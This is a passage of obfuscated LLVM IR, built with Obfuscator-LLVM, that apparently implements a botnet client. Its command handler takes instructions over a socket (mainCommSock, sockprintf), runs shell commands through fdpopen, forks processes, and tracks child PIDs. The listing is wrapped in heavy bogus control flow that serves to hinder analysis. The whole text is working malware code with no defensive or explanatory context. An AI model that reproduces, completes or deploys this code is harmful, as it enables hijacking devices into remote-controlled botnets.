  %493 = load i32, i32* @y.88
  %494 = sub i32 %492, 1
  %495 = mul i32 %492, %494
  %496 = urem i32 %495, 2
  %497 = icmp eq i32 %496, 0
  %498 = icmp slt i32 %493, 10
  %499 = or i1 %497, %498
  br i1 %499, label %originalBB68, label %originalBB68alteredBB

originalBB68:                                     ; preds = %originalBB68alteredBB, %491
  %500 = load i8*, i8** %15, align 8
  %501 = load i8, i8* %500, align 1
  %502 = zext i8 %501 to i32
  %503 = icmp ne i32 %502, 0
  %504 = load i32, i32* @x.87
  %505 = load i32, i32* @y.88
  %506 = sub i32 %504, 1
  %507 = mul i32 %504, %506
  %508 = urem i32 %507, 2
  %509 = icmp eq i32 %508, 0
  %510 = icmp slt i32 %505, 10
  %511 = or i1 %509, %510
  br i1 %511, label %originalBBpart270, label %originalBB68alteredBB

originalBBpart270:                                ; preds = %originalBB68
  br label %512

; <label>:512:                                    ; preds = %originalBBpart270, %486
  %513 = phi i1 [ false, %486 ], [ %503, %originalBBpart270 ]
  br i1 %513, label %514, label %533

; <label>:514:                                    ; preds = %512
  %515 = load i32, i32* @x.87
  %516 = load i32, i32* @y.88
  %517 = sub i32 %515, 1
  %518 = mul i32 %515, %517
  %519 = urem i32 %518, 2
  %520 = icmp eq i32 %519, 0
  %521 = icmp slt i32 %516, 10
  %522 = or i1 %520, %521
  br i1 %522, label %originalBB72, label %originalBB72alteredBB

originalBB72:                                     ; preds = %originalBB72alteredBB, %514
  %523 = load i8*, i8** %15, align 8
  %524 = getelementptr inbounds i8, i8* %523, i32 1
  store i8* %524, i8** %15, align 8
  %525 = load i32, i32* @x.87
  %526 = load i32, i32* @y.88
  %527 = sub i32 %525, 1
  %528 = mul i32 %525, %527
  %529 = urem i32 %528, 2
  %530 = icmp eq i32 %529, 0
  %531 = icmp slt i32 %526, 10
  %532 = or i1 %530, %531
  br i1 %532, label %originalBBpart274, label %originalBB72alteredBB

originalBBpart274:                                ; preds = %originalBB72
  br label %486

; <label>:533:                                    ; preds = %512
  %534 = load i8*, i8** %15, align 8
  store i8 0, i8* %534, align 1
  %535 = load i8*, i8** %15, align 8
  %536 = getelementptr inbounds i8, i8* %535, i32 1
  store i8* %536, i8** %15, align 8
  %537 = load i8*, i8** %17, align 8
  store i8* %537, i8** %18, align 8
  br label %538

; <label>:538:                                    ; preds = %542, %533
  %539 = load i8*, i8** %18, align 8
  %540 = load i8, i8* %539, align 1
  %541 = icmp ne i8 %540, 0
  br i1 %541, label %542, label %551

; <label>:542:                                    ; preds = %538
  %543 = load i8*, i8** %18, align 8
  %544 = load i8, i8* %543, align 1
  %545 = zext i8 %544 to i32
  %546 = call i32 @toupper(i32 %545) #10
  %547 = trunc i32 %546 to i8
  %548 = load i8*, i8** %18, align 8
  store i8 %547, i8* %548, align 1
  %549 = load i8*, i8** %18, align 8
  %550 = getelementptr inbounds i8, i8* %549, i32 1
  store i8* %550, i8** %18, align 8
  br label %538

; <label>:551:                                    ; preds = %538
  %552 = load i8*, i8** %17, align 8
  %553 = call i32 @strcmp(i8* %552, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.128, i32 0, i32 0)) #10
  %554 = icmp eq i32 %553, 0
  br i1 %554, label %555, label %658

; <label>:555:                                    ; preds = %551
  %556 = load i32, i32* @x.87
  %557 = load i32, i32* @y.88
  %558 = sub i32 %556, 1
  %559 = mul i32 %556, %558
  %560 = urem i32 %559, 2
  %561 = icmp eq i32 %560, 0
  %562 = icmp slt i32 %557, 10
  %563 = or i1 %561, %562
  br i1 %563, label %originalBB76, label %originalBB76alteredBB

originalBB76:                                     ; preds = %originalBB76alteredBB, %555
  %564 = call i32 @listFork()
  %565 = icmp ne i32 %564, 0
  %566 = load i32, i32* @x.87
  %567 = load i32, i32* @y.88
  %568 = sub i32 %566, 1
  %569 = mul i32 %566, %568
  %570 = urem i32 %569, 2
  %571 = icmp eq i32 %570, 0
  %572 = icmp slt i32 %567, 10
  %573 = or i1 %571, %572
  br i1 %573, label %originalBBpart278, label %originalBB76alteredBB

originalBBpart278:                                ; preds = %originalBB76
  br i1 %565, label %574, label %591

; <label>:574:                                    ; preds = %originalBBpart278
  %575 = load i32, i32* @x.87
  %576 = load i32, i32* @y.88
  %577 = sub i32 %575, 1
  %578 = mul i32 %575, %577
  %579 = urem i32 %578, 2
  %580 = icmp eq i32 %579, 0
  %581 = icmp slt i32 %576, 10
  %582 = or i1 %580, %581
  br i1 %582, label %originalBB80, label %originalBB80alteredBB

originalBB80:                                     ; preds = %originalBB80alteredBB, %574
  %583 = load i32, i32* @x.87
  %584 = load i32, i32* @y.88
  %585 = sub i32 %583, 1
  %586 = mul i32 %583, %585
  %587 = urem i32 %586, 2
  %588 = icmp eq i32 %587, 0
  %589 = icmp slt i32 %584, 10
  %590 = or i1 %588, %589
  br i1 %590, label %originalBBpart282, label %originalBB80alteredBB

originalBBpart282:                                ; preds = %originalBB80
  br label %129

; <label>:591:                                    ; preds = %originalBBpart278
  %592 = load i32, i32* @x.87
  %593 = load i32, i32* @y.88
  %594 = sub i32 %592, 1
  %595 = mul i32 %592, %594
  %596 = urem i32 %595, 2
  %597 = icmp eq i32 %596, 0
  %598 = icmp slt i32 %593, 10
  %599 = or i1 %597, %598
  br i1 %599, label %originalBB84, label %originalBB84alteredBB

originalBB84:                                     ; preds = %originalBB84alteredBB, %591
  %600 = getelementptr inbounds [1024 x i8], [1024 x i8]* %19, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %600, i8 0, i64 1024, i32 16, i1 false)
  %601 = getelementptr inbounds [1024 x i8], [1024 x i8]* %19, i32 0, i32 0
  %602 = load i8*, i8** %15, align 8
  %603 = call i32 (i8*, i8*, ...) @szprintf(i8* %601, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.129, i32 0, i32 0), i8* %602)
  %604 = getelementptr inbounds [1024 x i8], [1024 x i8]* %19, i32 0, i32 0
  %605 = call i32 @fdpopen(i8* %604, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.130, i32 0, i32 0))
  store i32 %605, i32* %20, align 4
  %606 = load i32, i32* @x.87
  %607 = load i32, i32* @y.88
  %608 = sub i32 %606, 1
  %609 = mul i32 %606, %608
  %610 = urem i32 %609, 2
  %611 = icmp eq i32 %610, 0
  %612 = icmp slt i32 %607, 10
  %613 = or i1 %611, %612
  br i1 %613, label %originalBBpart286, label %originalBB84alteredBB

originalBBpart286:                                ; preds = %originalBB84
  br label %614

; <label>:614:                                    ; preds = %originalBBpart290, %originalBBpart286
  %615 = getelementptr inbounds [1024 x i8], [1024 x i8]* %19, i32 0, i32 0
  %616 = load i32, i32* %20, align 4
  %617 = call i8* @fdgets(i8* %615, i32 1024, i32 %616)
  %618 = icmp ne i8* %617, null
  br i1 %618, label %619, label %639

; <label>:619:                                    ; preds = %614
  %620 = load i32, i32* @x.87
  %621 = load i32, i32* @y.88
  %622 = sub i32 %620, 1
  %623 = mul i32 %620, %622
  %624 = urem i32 %623, 2
  %625 = icmp eq i32 %624, 0
  %626 = icmp slt i32 %621, 10
  %627 = or i1 %625, %626
  br i1 %627, label %originalBB88, label %originalBB88alteredBB

originalBB88:                                     ; preds = %originalBB88alteredBB, %619
  %628 = getelementptr inbounds [1024 x i8], [1024 x i8]* %19, i32 0, i32 0
  call void @trim(i8* %628)
  %629 = getelementptr inbounds [1024 x i8], [1024 x i8]* %19, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %629, i8 0, i64 1024, i32 16, i1 false)
  %630 = call i32 @sleep(i32 1)
  %631 = load i32, i32* @x.87
  %632 = load i32, i32* @y.88
  %633 = sub i32 %631, 1
  %634 = mul i32 %631, %633
  %635 = urem i32 %634, 2
  %636 = icmp eq i32 %635, 0
  %637 = icmp slt i32 %632, 10
  %638 = or i1 %636, %637
  br i1 %638, label %originalBBpart290, label %originalBB88alteredBB

originalBBpart290:                                ; preds = %originalBB88
  br label %614

; <label>:639:                                    ; preds = %614
  %640 = load i32, i32* @x.87
  %641 = load i32, i32* @y.88
  %642 = sub i32 %640, 1
  %643 = mul i32 %640, %642
  %644 = urem i32 %643, 2
  %645 = icmp eq i32 %644, 0
  %646 = icmp slt i32 %641, 10
  %647 = or i1 %645, %646
  br i1 %647, label %originalBB92, label %originalBB92alteredBB

originalBB92:                                     ; preds = %originalBB92alteredBB, %639
  %648 = load i32, i32* %20, align 4
  %649 = call i32 @fdpclose(i32 %648)
  call void @exit(i32 0) #14
  %650 = load i32, i32* @x.87
  %651 = load i32, i32* @y.88
  %652 = sub i32 %650, 1
  %653 = mul i32 %650, %652
  %654 = urem i32 %653, 2
  %655 = icmp eq i32 %654, 0
  %656 = icmp slt i32 %651, 10
  %657 = or i1 %655, %656
  br i1 %657, label %originalBBpart294, label %originalBB92alteredBB

originalBBpart294:                                ; preds = %originalBB92
  unreachable

; <label>:658:                                    ; preds = %551
  %659 = load i32, i32* @x.87
  %660 = load i32, i32* @y.88
  %661 = sub i32 %659, 1
  %662 = mul i32 %659, %661
  %663 = urem i32 %662, 2
  %664 = icmp eq i32 %663, 0
  %665 = icmp slt i32 %660, 10
  %666 = or i1 %664, %665
  br i1 %666, label %originalBB96, label %originalBB96alteredBB

originalBB96:                                     ; preds = %originalBB96alteredBB, %658
  store i32 1, i32* %22, align 4
  %667 = load i8*, i8** %15, align 8
  %668 = call i8* @strtok(i8* %667, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.131, i32 0, i32 0)) #2
  store i8* %668, i8** %23, align 8
  %669 = load i8*, i8** %17, align 8
  %670 = getelementptr inbounds [10 x i8*], [10 x i8*]* %21, i64 0, i64 0
  store i8* %669, i8** %670, align 16
  %671 = load i32, i32* @x.87
  %672 = load i32, i32* @y.88
  %673 = sub i32 %671, 1
  %674 = mul i32 %671, %673
  %675 = urem i32 %674, 2
  %676 = icmp eq i32 %675, 0
  %677 = icmp slt i32 %672, 10
  %678 = or i1 %676, %677
  br i1 %678, label %originalBBpart298, label %originalBB96alteredBB

originalBBpart298:                                ; preds = %originalBB96
  br label %679

; <label>:679:                                    ; preds = %726, %originalBBpart298
  %680 = load i8*, i8** %23, align 8
  %681 = icmp ne i8* %680, null
  br i1 %681, label %682, label %728

; <label>:682:                                    ; preds = %679
  %683 = load i8*, i8** %23, align 8
  %684 = load i8, i8* %683, align 1
  %685 = zext i8 %684 to i32
  %686 = icmp ne i32 %685, 10
  br i1 %686, label %687, label %726

; <label>:687:                                    ; preds = %682
  %688 = load i32, i32* @x.87
  %689 = load i32, i32* @y.88
  %690 = sub i32 %688, 1
  %691 = mul i32 %688, %690
  %692 = urem i32 %691, 2
  %693 = icmp eq i32 %692, 0
  %694 = icmp slt i32 %689, 10
  %695 = or i1 %693, %694
  br i1 %695, label %originalBB100, label %originalBB100alteredBB

originalBB100:                                    ; preds = %originalBB100alteredBB, %687
  %696 = load i8*, i8** %23, align 8
  %697 = call i64 @strlen(i8* %696) #10
  %698 = add i64 %697, 1
  %699 = call noalias i8* @malloc(i64 %698) #2
  %700 = load i32, i32* %22, align 4
  %701 = sext i32 %700 to i64
  %702 = getelementptr inbounds [10 x i8*], [10 x i8*]* %21, i64 0, i64 %701
  store i8* %699, i8** %702, align 8
  %703 = load i32, i32* %22, align 4
  %704 = sext i32 %703 to i64
  %705 = getelementptr inbounds [10 x i8*], [10 x i8*]* %21, i64 0, i64 %704
  %706 = load i8*, i8** %705, align 8
  %707 = load i8*, i8** %23, align 8
  %708 = call i64 @strlen(i8* %707) #10
  %709 = add i64 %708, 1
  call void @llvm.memset.p0i8.i64(i8* %706, i8 0, i64 %709, i32 1, i1 false)
  %710 = load i32, i32* %22, align 4
  %711 = sext i32 %710 to i64
  %712 = getelementptr inbounds [10 x i8*], [10 x i8*]* %21, i64 0, i64 %711
  %713 = load i8*, i8** %712, align 8
  %714 = load i8*, i8** %23, align 8
  %715 = call i8* @strcpy(i8* %713, i8* %714) #2
  %716 = load i32, i32* %22, align 4
  %717 = add nsw i32 %716, 1
  store i32 %717, i32* %22, align 4
  %718 = load i32, i32* @x.87
  %719 = load i32, i32* @y.88
  %720 = sub i32 %718, 1
  %721 = mul i32 %718, %720
  %722 = urem i32 %721, 2
  %723 = icmp eq i32 %722, 0
  %724 = icmp slt i32 %719, 10
  %725 = or i1 %723, %724
  br i1 %725, label %originalBBpart2135, label %originalBB100alteredBB

originalBBpart2135:                               ; preds = %originalBB100
  br label %726

; <label>:726:                                    ; preds = %originalBBpart2135, %682
  %727 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.131, i32 0, i32 0)) #2
  store i8* %727, i8** %23, align 8
  br label %679

; <label>:728:                                    ; preds = %679
  %729 = load i32, i32* %22, align 4
  %730 = getelementptr inbounds [10 x i8*], [10 x i8*]* %21, i32 0, i32 0
  call void @processCmd(i32 %729, i8** %730)
  %731 = load i32, i32* %22, align 4
  %732 = icmp sgt i32 %731, 1
  br i1 %732, label %733, label %779

; <label>:733:                                    ; preds = %728
  store i32 1, i32* %24, align 4
  store i32 1, i32* %24, align 4
  br label %734

; <label>:734:                                    ; preds = %759, %733
  %735 = load i32, i32* %24, align 4
  %736 = load i32, i32* %22, align 4
  %737 = icmp slt i32 %735, %736
  br i1 %737, label %738, label %762

; <label>:738:                                    ; preds = %734
  %739 = load i32, i32* @x.87
  %740 = load i32, i32* @y.88
  %741 = sub i32 %739, 1
  %742 = mul i32 %739, %741
  %743 = urem i32 %742, 2
  %744 = icmp eq i32 %743, 0
  %745 = icmp slt i32 %740, 10
  %746 = or i1 %744, %745
  br i1 %746, label %originalBB137, label %originalBB137alteredBB

originalBB137:                                    ; preds = %originalBB137alteredBB, %738
  %747 = load i32, i32* %24, align 4
  %748 = sext i32 %747 to i64
  %749 = getelementptr inbounds [10 x i8*], [10 x i8*]* %21, i64 0, i64 %748
  %750 = load i8*, i8** %749, align 8
  call void @free(i8* %750) #2
  %751 = load i32, i32* @x.87
  %752 = load i32, i32* @y.88
  %753 = sub i32 %751, 1
  %754 = mul i32 %751, %753
  %755 = urem i32 %754, 2
  %756 = icmp eq i32 %755, 0
  %757 = icmp slt i32 %752, 10
  %758 = or i1 %756, %757
  br i1 %758, label %originalBBpart2139, label %originalBB137alteredBB

originalBBpart2139:                               ; preds = %originalBB137
  br label %759

; <label>:759:                                    ; preds = %originalBBpart2139
  %760 = load i32, i32* %24, align 4
  %761 = add nsw i32 %760, 1
  store i32 %761, i32* %24, align 4
  br label %734

; <label>:762:                                    ; preds = %734
  %763 = load i32, i32* @x.87
  %764 = load i32, i32* @y.88
  %765 = sub i32 %763, 1
  %766 = mul i32 %763, %765
  %767 = urem i32 %766, 2
  %768 = icmp eq i32 %767, 0
  %769 = icmp slt i32 %764, 10
  %770 = or i1 %768, %769
  br i1 %770, label %originalBB141, label %originalBB141alteredBB

originalBB141:                                    ; preds = %originalBB141alteredBB, %762
  %771 = load i32, i32* @x.87
  %772 = load i32, i32* @y.88
  %773 = sub i32 %771, 1
  %774 = mul i32 %771, %773
  %775 = urem i32 %774, 2
  %776 = icmp eq i32 %775, 0
  %777 = icmp slt i32 %772, 10
  %778 = or i1 %776, %777
  br i1 %778, label %originalBBpart2143, label %originalBB141alteredBB

originalBBpart2143:                               ; preds = %originalBB141
  br label %779

; <label>:779:                                    ; preds = %originalBBpart2143, %728
  br label %780

; <label>:780:                                    ; preds = %779, %339
  br label %129

; <label>:781:                                    ; preds = %129
  br label %120
                                                  ; No predecessors!
  %783 = load i32, i32* %3, align 4
  ret i32 %783

originalBBalteredBB:                              ; preds = %originalBB, %52
  %784 = load i32, i32* %7, align 4
  %785 = icmp ne i32 %784, 0
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %75
  %786 = load i32, i32* %8, align 4
  %787 = icmp ne i32 %786, 0
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %96
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %134
  store i32 0, i32* %12, align 4
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %151
  %788 = load i32, i32* %12, align 4
  %789 = sext i32 %788 to i64
  %790 = load i64, i64* @numpids, align 8
  %791 = icmp ult i64 %789, %790
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %183
  %792 = load i32, i32* %14, align 4
  %793 = zext i32 %792 to i64
  %794 = load i64, i64* @numpids, align 8
  %795 = icmp ult i64 %793, %794
  br label %originalBB18

originalBB22alteredBB:                            ; preds = %originalBB22, %204
  %796 = load i32*, i32** @pids, align 8
  %797 = load i32, i32* %14, align 4
  %798 = zext i32 %797 to i64
  %799 = getelementptr inbounds i32, i32* %796, i64 %798
  %800 = load i32, i32* %799, align 4
  %801 = load i32*, i32** @pids, align 8
  %802 = load i32, i32* %14, align 4
  %_ = sub i32 %802, 1
  %gen = mul i32 %_, 1
  %_23 = shl i32 %802, 1
  %_24 = sub i32 0, %802
  %gen25 = add i32 %_24, 1
  %803 = sub i32 %802, 1
  %804 = zext i32 %803 to i64
  %805 = getelementptr inbounds i32, i32* %801, i64 %804
  store i32 %800, i32* %805, align 4
  br label %originalBB22

originalBB29alteredBB:                            ; preds = %originalBB29, %231
  %806 = load i32, i32* %14, align 4
  %_30 = sub i32 %806, 1
  %gen31 = mul i32 %_30, 1
  %_32 = sub i32 0, %806
  %gen33 = add i32 %_32, 1
  %_34 = shl i32 %806, 1
  %807 = add i32 %806, 1
  store i32 %807, i32* %14, align 4
  br label %originalBB29

originalBB38alteredBB:                            ; preds = %originalBB38, %268
  %808 = load i32*, i32** @pids, align 8
  %809 = load i32, i32* %14, align 4
  %810 = zext i32 %809 to i64
  %811 = getelementptr inbounds i32, i32* %808, i64 %810
  %812 = load i32, i32* %811, align 4
  %813 = load i32*, i32** %13, align 8
  %814 = load i32, i32* %14, align 4
  %815 = zext i32 %814 to i64
  %816 = getelementptr inbounds i32, i32* %813, i64 %815
  store i32 %812, i32* %816, align 4
  br label %originalBB38

originalBB42alteredBB:                            ; preds = %originalBB42, %314
  %817 = load i32, i32* @mainCommSock, align 4
  %818 = call i32 (i32, i8*, ...) @sockprintf(i32 %817, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.126, i32 0, i32 0))
  br label %originalBB42

originalBB46alteredBB:                            ; preds = %originalBB46, %345
  %819 = load i8*, i8** %15, align 8
  %820 = getelementptr inbounds i8, i8* %819, i64 1
  store i8* %820, i8** %16, align 8
  br label %originalBB46

originalBB50alteredBB:                            ; preds = %originalBB50, %364
  %821 = load i8*, i8** %16, align 8
  %822 = load i8, i8* %821, align 1
  %823 = zext i8 %822 to i32
  %824 = icmp ne i32 %823, 32
  br label %originalBB50

originalBB54alteredBB:                            ; preds = %originalBB54, %385
  %825 = load i8*, i8** %16, align 8
  %826 = load i8, i8* %825, align 1
  %827 = zext i8 %826 to i32
  %828 = icmp ne i32 %827, 0
  br label %originalBB54

originalBB58alteredBB:                            ; preds = %originalBB58, %446
  %829 = load i8*, i8** %15, align 8
  %830 = load i8*, i8** %15, align 8
  %831 = call i64 @strlen(i8* %830) #10
  %_59 = sub i64 0, %831
  %gen60 = add i64 %_59, 1
  %832 = sub i64 %831, 1
  %833 = getelementptr inbounds i8, i8* %829, i64 %832
  store i8 0, i8* %833, align 1
  br label %originalBB58

originalBB64alteredBB:                            ; preds = %originalBB64, %468
  %834 = load i8*, i8** %15, align 8
  store i8* %834, i8** %17, align 8
  br label %originalBB64

originalBB68alteredBB:                            ; preds = %originalBB68, %491
  %835 = load i8*, i8** %15, align 8
  %836 = load i8, i8* %835, align 1
  %837 = zext i8 %836 to i32
  %838 = icmp ne i32 %837, 0
  br label %originalBB68

originalBB72alteredBB:                            ; preds = %originalBB72, %514
  %839 = load i8*, i8** %15, align 8
  %840 = getelementptr inbounds i8, i8* %839, i32 1
  store i8* %840, i8** %15, align 8
  br label %originalBB72

originalBB76alteredBB:                            ; preds = %originalBB76, %555
  %841 = call i32 @listFork()
  %842 = icmp ne i32 %841, 0
  br label %originalBB76

originalBB80alteredBB:                            ; preds = %originalBB80, %574
  br label %originalBB80

originalBB84alteredBB:                            ; preds = %originalBB84, %591
  %843 = getelementptr inbounds [1024 x i8], [1024 x i8]* %19, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %843, i8 0, i64 1024, i32 16, i1 false)
  %844 = getelementptr inbounds [1024 x i8], [1024 x i8]* %19, i32 0, i32 0
  %845 = load i8*, i8** %15, align 8
  %846 = call i32 (i8*, i8*, ...) @szprintf(i8* %844, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.129, i32 0, i32 0), i8* %845)
  %847 = getelementptr inbounds [1024 x i8], [1024 x i8]* %19, i32 0, i32 0
  %848 = call i32 @fdpopen(i8* %847, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.130, i32 0, i32 0))
  store i32 %848, i32* %20, align 4
  br label %originalBB84

originalBB88alteredBB:                            ; preds = %originalBB88, %619
  %849 = getelementptr inbounds [1024 x i8], [1024 x i8]* %19, i32 0, i32 0
  call void @trim(i8* %849)
  %850 = getelementptr inbounds [1024 x i8], [1024 x i8]* %19, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %850, i8 0, i64 1024, i32 16, i1 false)
  %851 = call i32 @sleep(i32 1)
  br label %originalBB88

originalBB92alteredBB:                            ; preds = %originalBB92, %639
  %852 = load i32, i32* %20, align 4
  %853 = call i32 @fdpclose(i32 %852)
  call void @exit(i32 0) #14
  br label %originalBB92

originalBB96alteredBB:                            ; preds = %originalBB96, %658
  store i32 1, i32* %22, align 4
  %854 = load i8*, i8** %15, align 8
  %855 = call i8* @strtok(i8* %854, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.131, i32 0, i32 0)) #2
  store i8* %855, i8** %23, align 8
  %856 = load i8*, i8** %17, align 8
  %857 = getelementptr inbounds [10 x i8*], [10 x i8*]* %21, i64 0, i64 0
  store i8* %856, i8** %857, align 16
  br label %originalBB96

originalBB100alteredBB:                           ; preds = %originalBB100, %687
  %858 = load i8*, i8** %23, align 8
  %859 = call i64 @strlen(i8* %858) #10
  %_101 = sub i64 0, %859
  %gen102 = add i64 %_101, 1
  %_103 = sub i64 %859, 1
  %gen104 = mul i64 %_103, 1
  %_105 = sub i64 0, %859
  %gen106 = add i64 %_105, 1
  %_107 = sub i64 %859, 1
  %gen108 = mul i64 %_107, 1
  %_109 = sub i64 0, %859
  %gen110 = add i64 %_109, 1
  %_111 = sub i64 %859, 1
  %gen112 = mul i64 %_111, 1
  %_113 = shl i64 %859, 1
  %_114 = shl i64 %859, 1
  %860 = add i64 %859, 1
  %861 = call noalias i8* @malloc(i64 %860) #2
  %862 = load i32, i32* %22, align 4
  %863 = sext i32 %862 to i64
  %864 = getelementptr inbounds [10 x i8*], [10 x i8*]* %21, i64 0, i64 %863
  store i8* %861, i8** %864, align 8
  %865 = load i32, i32* %22, align 4
  %866 = sext i32 %865 to i64
  %867 = getelementptr inbounds [10 x i8*], [10 x i8*]* %21, i64 0, i64 %866
  %868 = load i8*, i8** %867, align 8
  %869 = load i8*, i8** %23, align 8
  %870 = call i64 @strlen(i8* %869) #10
  %_115 = shl i64 %870, 1
  %_116 = shl i64 %870, 1
  %_117 = shl i64 %870, 1
  %_118 = sub i64 %870, 1
  %gen119 = mul i64 %_118, 1
  %_120 = shl i64 %870, 1
  %_121 = sub i64 %870, 1
  %gen122 = mul i64 %_121, 1
  %_123 = sub i64 0, %870
  %gen124 = add i64 %_123, 1
  %_125 = shl i64 %870, 1
  %_126 = sub i64 %870, 1
  %gen127 = mul i64 %_126, 1
  %871 = add i64 %870, 1
  call void @llvm.memset.p0i8.i64(i8* %868, i8 0, i64 %871, i32 1, i1 false)
  %872 = load i32, i32* %22, align 4
  %873 = sext i32 %872 to i64
  %874 = getelementptr inbounds [10 x i8*], [10 x i8*]* %21, i64 0, i64 %873
  %875 = load i8*, i8** %874, align 8
  %876 = load i8*, i8** %23, align 8
  %877 = call i8* @strcpy(i8* %875, i8* %876) #2
  %878 = load i32, i32* %22, align 4
  %_128 = shl i32 %878, 1
  %_129 = sub i32 %878, 1
  %gen130 = mul i32 %_129, 1
  %_131 = shl i32 %878, 1
  %_132 = sub i32 %878, 1
  %gen133 = mul i32 %_132, 1
  %879 = add nsw i32 %878, 1
  store i32 %879, i32* %22, align 4
  br label %originalBB100

originalBB137alteredBB:                           ; preds = %originalBB137, %738
  %880 = load i32, i32* %24, align 4
  %881 = sext i32 %880 to i64
  %882 = getelementptr inbounds [10 x i8*], [10 x i8*]* %21, i64 0, i64 %881
  %883 = load i8*, i8** %882, align 8
  call void @free(i8* %883) #2
  br label %originalBB137

originalBB141alteredBB:                           ; preds = %originalBB141, %762
  br label %originalBB141
}

declare i32 @printf(i8*, ...) #3

; Function Attrs: nounwind
declare i8* @strncpy(i8*, i8*, i64) #4

declare i32 @prctl(...) #3

; Function Attrs: nounwind
declare i32 @setsid() #4

; Function Attrs: nounwind
declare i32 @chdir(i8*) #4

; Function Attrs: nounwind
declare void (i32)* @signal(i32, void (i32)*) #4

attributes #0 = { noinline nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind readonly "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { nounwind }
attributes #3 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #5 = { argmemonly nounwind }
attributes #6 = { nounwind returns_twice "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #7 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #8 = { nounwind readnone "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #9 = { noreturn nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #10 = { nounwind readonly }
attributes #11 = { nounwind returns_twice }
attributes #12 = { noreturn }
attributes #13 = { nounwind readnone }
attributes #14 = { noreturn nounwind }

!llvm.ident = !{!0, !0}

!0 = !{!"Obfuscator-LLVM clang version 4.0.1  (based on Obfuscator-LLVM 4.0.1)"}
!1 = !{i32 -2146616014}
!2 = !{i32 -2146615323}
!3 = !{i32 -2146614574}
!4 = !{i32 -2146613751}
!5 = !{i32 -2146612931}
!6 = !{i32 -2146611527}
!7 = !{i32 -2146610665}
!8 = !{i32 -2146609944}
